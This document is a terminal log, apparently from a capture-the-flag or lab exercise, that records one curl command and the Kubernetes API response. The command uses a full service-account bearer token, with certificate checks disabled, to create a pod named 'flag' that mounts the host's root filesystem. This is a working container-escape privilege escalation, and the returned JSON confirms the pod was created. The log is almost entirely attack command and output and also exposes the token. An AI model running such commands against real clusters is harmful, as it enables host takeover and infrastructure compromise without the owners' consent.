### [2026-04-05 11:27:02] curl -k -X POST -H Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik5scHZ2eDdQNFlhOXhDNXVXRVdYTUExbUprYUFKcjB6dEJWYTBPSkZaNTgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODA2ODkxNzAwLCJpYXQiOjE3NzUzNTU3MDAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjAyMWU1YTc5LTc1NmMtNGMwMS1iNjEyLTdkMWNjNGViZDI0YiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImVjYTdmNGM2LWZmNWItNDE4NC1hMTE0LTk3MzIxNmM3OTQ2MCJ9LCJ3YXJuYWZ0ZXIiOjE3NzUzNTkzMDd9LCJuYmYiOjE3NzUzNTU3MDAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.LBjsaohknTIRqQ9MVhTItgPciDLJ1b8p0Sm5GgWDLq126sFmGeErSnYIHxDSzDlpA5giC4F3en-Txa0ZWKNpJkPWQcrl6qsuIZ4oKJF6LtONoUlH8Osr3ni8V28ooRvRLgxM1-tGM5WvEIKyrZHlZy2RsuYLXFyd5XPtW9ZX4DpO7wUVJluYQBYInVpmuhdqR4uNT0pNkaEL_Tqyb12KMUqdXa1zzBo_dJ4LVYRmgWOasppBIIz8ICr6t1vYFVHLQTkaFX7kVE9wD91E1Zd-dreWktbFiNKYc-acY79X9fkRnQ-HnID4g7SKmtJyjsYF1pcVzpf-dL-SKfaPUkasEA -H Content-Type: application/json https://10.129.96.167:8443/api/v1/namespaces/default/pods -d {"apiVersion":"v1","kind":"Pod","metadata":{"name":"flag"},"spec":{"containers":[{"name":"flag","image":"nginx:1.14.2","imagePullPolicy":"IfNotPresent","command":["/bin/bash","-c","sleep 1000"],"volumeMounts":[{"name":"h","mountPath":"/h"}]}],"volumes":[{"name":"h","hostPath":{"path":"/"}}]}}

$ curl -k -X POST -H Authorization: Bearer eyJhbGciOiJSUzI1NiIsImtpZCI6Ik5scHZ2eDdQNFlhOXhDNXVXRVdYTUExbUprYUFKcjB6dEJWYTBPSkZaNTgifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxODA2ODkxNzAwLCJpYXQiOjE3NzUzNTU3MDAsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6IjAyMWU1YTc5LTc1NmMtNGMwMS1iNjEyLTdkMWNjNGViZDI0YiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6ImVjYTdmNGM2LWZmNWItNDE4NC1hMTE0LTk3MzIxNmM3OTQ2MCJ9LCJ3YXJuYWZ0ZXIiOjE3NzUzNTkzMDd9LCJuYmYiOjE3NzUzNTU3MDAsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.LBjsaohknTIRqQ9MVhTItgPciDLJ1b8p0Sm5GgWDLq126sFmGeErSnYIHxDSzDlpA5giC4F3en-Txa0ZWKNpJkPWQcrl6qsuIZ4oKJF6LtONoUlH8Osr3ni8V28ooRvRLgxM1-tGM5WvEIKyrZHlZy2RsuYLXFyd5XPtW9ZX4DpO7wUVJluYQBYInVpmuhdqR4uNT0pNkaEL_Tqyb12KMUqdXa1zzBo_dJ4LVYRmgWOasppBIIz8ICr6t1vYFVHLQTkaFX7kVE9wD91E1Zd-dreWktbFiNKYc-acY79X9fkRnQ-HnID4g7SKmtJyjsYF1pcVzpf-dL-SKfaPUkasEA -H Content-Type: application/json https://10.129.96.167:8443/api/v1/namespaces/default/pods -d {"apiVersion":"v1","kind":"Pod","metadata":{"name":"flag"},"spec":{"containers":[{"name":"flag","image":"nginx:1.14.2","imagePullPolicy":"IfNotPresent","command":["/bin/bash","-c","sleep 1000"],"volumeMounts":[{"name":"h","mountPath":"/h"}]}],"volumes":[{"name":"h","hostPath":{"path":"/"}}]}}

  % Total    % Received % Xferd  Average Speed  Time    Time    Time   Current
                                 Dload  Upload  Total   Spent   Left   Speed
  0      0   0      0   0      0      0      0                              0100   3854 100   3561 100    293  53850   4430                              0100   3854 100   3561 100    293  53777   4424                              0100   3854 100   3561 100    293  53743   4422                              0
{
  "kind": "Pod",
  "apiVersion": "v1",
  "metadata": {
    "name": "flag",
    "namespace": "default",
    "uid": "49fe77fe-5af2-4318-987d-0d18e1339085",
    "resourceVersion": "37904",
    "creationTimestamp": "2026-04-05T03:27:11Z",
    "managedFields": [
      {
        "manager": "curl",
        "operation": "Update",
        "apiVersion": "v1",
        "time": "2026-04-05T03:27:11Z",
        "fieldsType": "FieldsV1",
        "fieldsV1": {"f:spec":{"f:containers":{"k:{\"name\":\"flag\"}":{".":{},"f:command":{},"f:image":{},"f:imagePullPolicy":{},"f:name":{},"f:resources":{},"f:terminationMessagePath":{},"f:terminationMessagePolicy":{},"f:volumeMounts":{".":{},"k:{\"mountPath\":\"/h\"}":{".":{},"f:mountPath":{},"f:name":{}}}}},"f:dnsPolicy":{},"f:enableServiceLinks":{},"f:restartPolicy":{},"f:schedulerName":{},"f:securityContext":{},"f:terminationGracePeriodSeconds":{},"f:volumes":{".":{},"k:{\"name\":\"h\"}":{".":{},"f:hostPath":{".":{},"f:path":{},"f:type":{}},"f:name":{}}}}}
      }
    ]
  },
  "spec": {
    "volumes": [
      {
        "name": "h",
        "hostPath": {
          "path": "/",
          "type": ""
        }
      },
      {
        "name": "kube-api-access-wc2wh",
        "projected": {
          "sources": [
            {
              "serviceAccountToken": {
                "expirationSeconds": 3607,
                "path": "token"
              }
            },
            {
              "configMap": {
                "name": "kube-root-ca.crt",
                "items": [
                  {
                    "key": "ca.crt",
                    "path": "ca.crt"
                  }
                ]
              }
            },
            {
              "downwardAPI": {
                "items": [
                  {
                    "path": "namespace",
                    "fieldRef": {
                      "apiVersion": "v1",
                      "fieldPath": "metadata.namespace"
                    }
                  }
                ]
              }
            }
          ],
          "defaultMode": 420
        }
      }
    ],
    "containers": [
      {
        "name": "flag",
        "image": "nginx:1.14.2",
        "command": [
          "/bin/bash",
          "-c",
          "sleep 1000"
        ],
        "resources": {
          
        },
        "volumeMounts": [
          {
            "name": "h",
            "mountPath": "/h"
          },
          {
            "name": "kube-api-access-wc2wh",
            "readOnly": true,
            "mountPath": "/var/run/secrets/kubernetes.io/serviceaccount"
          }
        ],
        "terminationMessagePath": "/dev/termination-log",
        "terminationMessagePolicy": "File",
        "imagePullPolicy": "IfNotPresent"
      }
    ],
    "restartPolicy": "Always",
    "terminationGracePeriodSeconds": 30,
    "dnsPolicy": "ClusterFirst",
    "serviceAccountName": "default",
    "serviceAccount": "default",
    "securityContext": {
      
    },
    "schedulerName": "default-scheduler",
    "tolerations": [
      {
        "key": "node.kubernetes.io/not-ready",
        "operator": "Exists",
        "effect": "NoExecute",
        "tolerationSeconds": 300
      },
      {
        "key": "node.kubernetes.io/unreachable",
        "operator": "Exists",
        "effect": "NoExecute",
        "tolerationSeconds": 300
      }
    ],
    "priority": 0,
    "enableServiceLinks": true,
    "preemptionPolicy": "PreemptLowerPriority"
  },
  "status": {
    "phase": "Pending",
    "qosClass": "BestEffort"
  }
}
# Exit code: 0
# Duration: 2026-04-05 11:27:02
